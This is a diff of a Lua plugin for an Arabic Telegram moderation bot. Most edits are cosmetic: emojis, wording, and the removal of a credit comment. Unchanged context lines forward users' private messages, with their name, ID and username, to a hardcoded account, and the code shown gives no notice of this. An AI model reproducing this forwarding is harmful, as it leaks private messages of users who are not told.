@@ -17,21 +17,20 @@ end
 
 --------------[data function to save rdod ]---------------
 if data[tostring(msg.to.id)] then
-if data[tostring(msg.to.id)]['settings'] then
 local settings = data[tostring(msg.to.id)]['settings'] 
 if data[tostring(msg.to.id)]['settings']['replay'] then
- lock_reply = data[tostring(msg.to.id)]['settings']['replay']  
-end end end
+ lock_reply = data[tostring(msg.to.id)]['settings']['replay'] 
+end end
 
 ---------------[End Function data] -----------------------
  if w=="رد" then
  if not is_owner(msg) then
-     return"♨️ للمدراء فقط ! 💯"
+     return"♨️ للمدراء فقط ! 👮‍♀️"
      end
      
   if ww == 'مسح الكل' then
 if next(data[tostring(msg.to.id)]['replay']) == nil then
-return  " عذراً 🌝".. ":{" ..msg.from.first_name.. "}:".."\n".."\n".." 🗯قائمة الردود فارغة بالفعل 💯 "
+return  " عذراً 🌝".. ":{" ..msg.from.first_name.. "}:".."\n".."\n".." 🗯قائمة الردود فارغة بالفعل 👮‍♀️ "
 else
 for k,v in pairs(data[tostring(msg.to.id)]['replay']) do
 data[tostring(msg.to.id)]['replay'][tostring(k)] = nil
@@ -48,7 +47,7 @@ save_data(_config.moderation.data, data)
  
 elseif ww == 'مسح' then
 if not data[tostring(msg.to.id)]['replay'][r3] then
-return '🗯هذا الرد ليش مضاف في قائمه الردود 💯'
+return '🗯هذا الرد ليش مضاف في قائمه الردود 👮‍♀️'
 else
 data[tostring(msg.to.id)]['replay'][r3] = nil
 save_data(_config.moderation.data, data)
@@ -62,7 +61,7 @@ if next(data[tostring(msg.to.id)]['replay']) ==nil then
 return '♨️ لايوجد ردود مضافه حاليا ❗️'
 else
 local i = 1
-local message = '🌟| ردود البوت في المجموعه  💯\n\n'
+local message = '🌟| ردود البوت في المجموعه  👮‍♀️\n\n'
 for k,v in pairs(data[tostring(msg.to.id)]['replay']) do
 message = message ..i..' - '..k..' [' ..v.. '] \n'
 i = i + 1
@@ -72,12 +71,11 @@ end
 
   end
   
--- by @TH3BOSS
 
 
 --------------------[Test Bot]----------------------------
 if w =="تيست" then
-return "💯 البوت شـغــال 🚀"
+return "👮‍♀️ البوت شـغــال 🚀"
 elseif w == "اسمي" then
 return  "\n" ..msg.from.first_name.."\n" 
 elseif w == "معرفي" then
@@ -95,12 +93,12 @@ return '🌟|¦لا توجد صورة في بروفايلك !!! '
 end
 elseif w=="اريد رابط الحذف" or w=="اريد رابط حذف" or w=="رابط حذف" or w=="رابط الحذف" then
 return [[
-🌟| رابط حذف التلي ⬇️ :
+🌟| رابط حذف التلي 👮‍♀️ :
 🌟| احذف ولا ترجع عيش حياتك 😪💔
 🌟| https://telegram.org/deactivate
 ]] 
 elseif w== 'ايدي' and msg.to.type == 'pv' then
-return "🌟|    ايدي البوت : "..msg.to.id.. "\n\n🌟|    ايدي حسابك : "..msg.from.id.. "\n مـطـور الـسـورس\n الـزعـيـم  محمد هشام   > @TH3BOSS 🌟| "
+return "🌟|    ايدي البوت : "..msg.to.id.. "\n\n🌟|    ايدي حسابك : "..msg.from.id.. "\n مـطـور الـسـورس\n محمد هشام   > @TH3BOSS 🌟| "
 elseif w=="رتبتي" then
  local rank
 if is_sudo(msg) then
@@ -112,12 +110,12 @@ rank = ' ادمن في البوت 😺'
 else
 rank = 'مجرد عضو 😹'
 end
-return '🌟|رتبتك : '..rank
+return '🌟|¦ رتبتك : '..rank
 end
 ------------[lock and unlock reply in pv ]---------
     
 if (msg.to.type == "private") and not is_sudo(msg) then
-send_msg(msg.to.id, " 🌟| Welcome My Dear\n\nTH3BOSS V18 \n\n🌟|For More Information Subscribe To The Channel @llDEV1ll \n🌟|  https://github.com/moody2020/BOSSTOKEN \n\n🌟| Dev :  @TH3BOSS\n\n🌟| groupmanger : @lBOSSl \n\n🌟| Channel :  @llDEV1ll ",nil, 'html')
+send_msg(msg.to.id, " 🌟| Welcome My Dear\n\nTH3BOSS V18 \n\n🌟|For More Information Subscribe To The Channel @llDEV1ll \n🌟|  https://github.com/moody2020/TOKEN \n\n🌟| Dev :  @TH3BOSS\n\n🌟| groupmanger : @lBOSSl \n\n🌟| Channel :  @llDEV1ll ",nil, 'html')
 local pvmsg ="🌟|الاسم :"..name_user.."\n🌟|الايدي : ["..msg.from.id.."]\n🌟|المعرف : ["..usernamex.."]\n 📥الرسالة: \n\n"..msg.text
 
 send_msg(60809019, pvmsg, nil, 'md')
@@ -213,12 +211,8 @@ local song = {
 }
 -------reply By stickers -------
 
-local sound = {
-"data/audio/aml_mnk.ogg",
-"data/audio/mozeka.ogg"
-}
 local function sudoname(ww)
-if string.match(ww, 'محمد')  or  string.match(ww, 'حمودي') or  string.match(ww, 'حمدوه') or  string.match(ww, 'حموش')  or string.match(ww, 'حموشي') then
+if string.match(ww, 'محمد')  or  string.match(ww, 'حمودي') or  string.match(ww, 'حماده') or  string.match(ww, 'حموشي')  or string.match(ww, 'حموشه') then
 return true
 else
 return false
@@ -231,12 +225,12 @@ return  su[math.random(#su)]
 elseif not is_sudo(msg) and w == "زعيم" and not ww then 
 return  ss97[math.random(#ss97)]  
 elseif w == "كول" and ww then
-if string.len(ww) > 60 then return "🌟|ما اكدر اكول اكثر من 60 حرف 🙌🏾" end
-if sudoname(ww) then return "📌 ما اكدر احجي عليه مستحيل 🕵🏻" end
+if string.len(ww) > 60 then return "🌟|¦ ما اكدر اكول اكثر من 60 حرف 🙌🏾" end
+if sudoname(ww) then return "🌟| ما اكدر احجي عليه مستحيل 🕵🏻" end
  send_msg(msg.to.id, '<code>'..ww..'</code>', nil, 'html')
 elseif w == "كله" and ww then
-if string.len(ww) > 60 then return "🌟|ما اكدر اكله اكثر من 60 حرف 🙌🏾" end
-if sudoname(ww) then return "📌 ما اكدر احجي عليه مستحيل 🕵🏻" end
+if string.len(ww) > 60 then return "🌟|¦ ما اكدر اكله اكثر من 60 حرف 🙌🏾" end
+if sudoname(ww) then return "🌟| ما اكدر احجي عليه مستحيل 🕵🏻" end
 if msg.reply_id then
  send_msg(msg.to.id, '<code>'..ww..'</code>',msg.reply_id, 'html')
 end
@@ -247,19 +241,19 @@ send_msg(msg.to.id, 'يا ول شو طالعة عينك😒 من البنات م
 end
 elseif w == "بوس" and ww then 
 if sudoname(ww) then
-return " امممح حمودي  هذا العشق😻💋"
+return " امممح حمودي هذا العشق😻💋"
 else
 if msg.reply_id then
 return  bs[math.random(#bs)] 
 else
 return 
-send_msg(msg.to.id, "📌 وينه بله سويله رد 🕵🏻", msg.reply_id ,'html')
+send_msg(msg.to.id, "🌟| وينه بله سويله رد 🕵🏻", msg.reply_id ,'html')
 
 end
 end
 elseif w == "تحب" and ww then
 if sudoname(ww) then
-return "اموت علية ةحمودي هذا العشق😻💋"
+return "اموت عليةة حمودي هذا العشق😻💋"
 else
 return  thb[math.random(#thb)] 
 end
@@ -280,7 +274,7 @@ return  ss97[math.random(#ss97)]
 elseif w== "غني" or w=="غنيلي" then
 return  song[math.random(#song)] 
 elseif w=="اتفل" or w=="تفل" then
-if is_mod(msg) then return 'ختفوووووووووو💦💦️️' else return "📌 انجب ما اتفل عيب 😼🙌🏿" end
+if is_mod(msg) then return 'ختفوووووووووو💦💦️️' else return "🌟| انجب ما اتفل عيب 😼🙌🏿" end
 elseif w== "تف" then
 return  "عيب ابني/بتي اتفل/ي اكبر منها شوية 😌😹"
 elseif w== "شلونكم" or w== "شلونك" or w== "شونك" or w== "شونكم"   then
@@ -506,4 +500,3 @@ run = run,
 }
 end
 -- write by Dev TH3BOSS
--- tele : @TH3BOSS
